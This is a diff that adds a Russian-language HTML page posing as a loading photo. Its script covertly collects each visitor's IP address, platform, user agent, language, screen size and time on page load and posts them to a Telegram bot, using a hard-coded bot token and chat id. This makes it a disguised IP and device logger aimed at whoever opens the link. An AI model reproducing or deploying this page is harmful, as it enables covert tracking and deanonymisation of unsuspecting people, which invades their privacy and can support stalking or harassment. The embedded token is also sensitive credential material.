@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка фото...</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        img { max-width: 90%; border-radius: 10px; opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <img src="https://picsum.photos/800/600" alt="Фото">
+    <p>Загрузка высокого качества...</p>
+
+    <script>
+        // Собираем данные
+        let data = {
+            ip: "Ожидание...",
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screen: screen.width + "x" + screen.height,
+            time: new Date().toLocaleString()
+        };
+
+        // Запрос к API для получения IP (упрощенно)
+        fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(res => { data.ip = res.ip; send(); })
+        .catch(() => { data.ip = "Неизвестно"; send(); });
+
+        // Отправка в Telegram
+        function send() {
+            const token = "9173439883:AAE0SS1Zx4kUugqZXNcbu6Ec2PvRfqkYLN4";
+            const chat_id = "9236744381";
+            const text = `🎯 *Новый клик!*\n\n📱 Устройство: ${data.platform}\n🌐 IP: ${data.ip}\n📏 Экран: ${data.screen}\n🗣 Язык: ${data.language}\n📅 Время: ${data.time}\n\n🔍 UA: \`${data.userAgent}\``;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: "Markdown" })
+            });
+        }
+    </script>
+</body>
+</html>
